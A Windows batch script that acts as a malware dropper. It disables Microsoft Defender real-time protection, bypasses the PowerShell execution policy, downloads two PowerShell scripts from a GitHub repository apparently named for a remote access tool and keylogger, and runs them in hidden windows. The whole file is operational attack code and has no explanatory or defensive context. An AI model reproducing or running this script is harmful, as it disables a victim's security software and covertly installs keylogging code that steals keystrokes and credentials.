@echo off
powershell Set-MpPreference -DisableRealtimeMonitoring $true
powershell Set-ExecutionPolicy -ExecutionPolicy ByPass -Scope Process
powershell -C "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/YouS0/ONLYRAT/main/DucKey-Logger/p.ps1' -OutFile 'p.ps1'"
powershell -C "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/YouS0/ONLYRAT/main/DucKey-Logger/l.ps1' -OutFile 'l.ps1'"
powershell Start-Process powershell.exe -WindowStyle Hidden ".\l.ps1"
powershell Start-Process powershell.exe -WindowStyle Hidden ".\p.ps1"